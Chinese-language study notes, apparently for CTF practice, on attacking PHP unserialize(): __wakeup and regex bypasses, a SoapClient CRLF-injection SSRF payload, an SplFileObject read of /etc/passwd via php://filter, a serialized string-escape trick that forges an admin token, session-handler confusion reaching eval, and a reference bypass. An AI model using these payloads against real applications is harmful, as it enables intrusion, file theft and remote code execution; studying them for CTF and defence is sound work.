[PHP: 魔术方法 - Manual](https://www.php.net/manual/zh/language.oop5.magic.php)

`serialize()`
`unserialize()`

```
__construct()，类的构造函数(创建对象时执行)
__destruct()，类的析构函数（销毁对象时执行）

__serialize (),
如果类中同时定义了 __serialize() 和 __sleep() 两个魔术方法，则只有 __serialize()方法会被调用

__unserialize()
如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略


__call()，在对象中调用一个不可访问方法时调用
__callStatic()，用静态方式中调用一个不可访问方法时调用
__get()，获得一个类的成员变量时调用
__set()，设置一个类的成员变量时调用
__isset()，当对不可访问属性调用isset()或empty()时调用
__unset()，当对不可访问属性调用unset()时被调用
__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，创建对象之后 ，对对象的属性检查 ，若属性检查通过 ，就调用 __wakeup() 方法,因此这里我们仅需要破坏对象属性检查就可以绕过 __wakeup() 函数 ， 最简单的方法就是增大对象属性的个数 ， 使其反序列化异常 .

__toString()，类被当成字符串时的回应方法

__invoke()，调用函数的方式调用一个对象时的回应方法

__set_state()，调用var_export()导出类时，此静态方法会被调用
__clone()，当对象复制完成时调用
__autoload()，尝试加载未定义的类
__debugInfo()，打印所需调试信息


常需要urlencode()
```

```
当被正则表达式过滤时，可以在反序列化串的O:后加个加号“+”

str_replace('O:', 'O:+',$a);

例如：
if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user']))
	$user = unserialize($_COOKIE['user']);       
```


```
修改反序列化串的对象属性个数（一般大于原个数），绕过wakeup函数
```
[PHP反序列化中wakeup()绕过总结 – fushulingのblog](https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/)

# 原生类的反序列化

```
当没有什么对象时的序列化，即用到原生类的反序列化

SoapClient

必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法,通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容（用于伪造IP、POST数据等）

<?php
$a = new SoapClient(null,
    array(
        'user_agent' => "zz\r\nx-forwarded-for:127.0.0.1,127.0.0.1\r\nContent-type:application/x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken=ctfshow",
        'uri' => 'zz',
        'location' => 'http://127.0.0.1/flag.php'
    )
);
$b = serialize($a);
echo urlencode($b);
?>
```

SplFileObject只能读文件只能读取第一行的内容，可以使用php伪协议读取base64后的内容
```
$a = new SplFileObject("php://filter/read=convert.base64-encode/resource=/etc/passwd");  <br>echo $a;
```

# 字符串逃逸

```
反序列化字符串逃逸，运用的思想跟sql注入的闭合相似

有一个序列化字符串，我们要改变token属性，但我们无法直接控制它的值。我们只能给from，msg，to传递值，即这三个属性是可控的

通过闭包改变token的值，然后用替换字符函数，调整字符的数量

例如：

str_replace会将fuck替换为loveU，且替换是在序列化之后进行的，也就是说，实际字符串长度增加了1，但标明的字符串长度任然为原值（实际情况可变长变短）

<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
	public function __destruct(){
		file_put_contents('877.php','<?php phpinfo()?>;');
	}
}

$a=new message('1','2','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}');
$a=serialize($a);
$a=str_replace('fuck','lover',$a);
echo $a,'<br/>';
echo strlen('loverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverlover');
?>


序列化串：
O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:135:"loverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverlover";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}

```


# session序列化

```
关于session和cookie，建议都用bp而不用hackbar，不同cookie之间用;分隔
```
[PHP session反序列化漏洞原理解析 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/324519.html)
```
文件先以php_serialize处理器(a:1:{s:4:"name";s:6:"harden";})，而其它的页面以默认php处理器(name|s:6:"harden";)来存储session数据，于是我们便可构造payload,其中漏洞为php处理器会将'|'之后的反序列化

'|'.serialize($a);

先在前者上传构造session，再访问后者网站

例：
test.php

<?php
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
echo $_SESSION['session'];
?>

test1.php

<?php
session_start();
class f4ke{
    public $name;
    function __wakeup(){
      echo "Who are you?";
    }
    function __destruct(){
      eval($this->name);
    }
}
$str = new f4ke();
?>
```

# 传址绕过

```
当需要绕过需要不同值相同时，可采用传址绕过（在PHP中当令$a=&$b时，可直接意味两个变量的地址相同）

例如：

<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$a=new ctfshowAdmin(1,2);
$a->token=&$a->password;
echo serialize($a),"<br/>";
echo urlencode(serialize($a)),'<br/>';
echo $a->password,$a->token;
?>

```


# 大小写绕过

```
当对象名被正则时，可以试试大小写，一般是不敏感（除非设置i）
```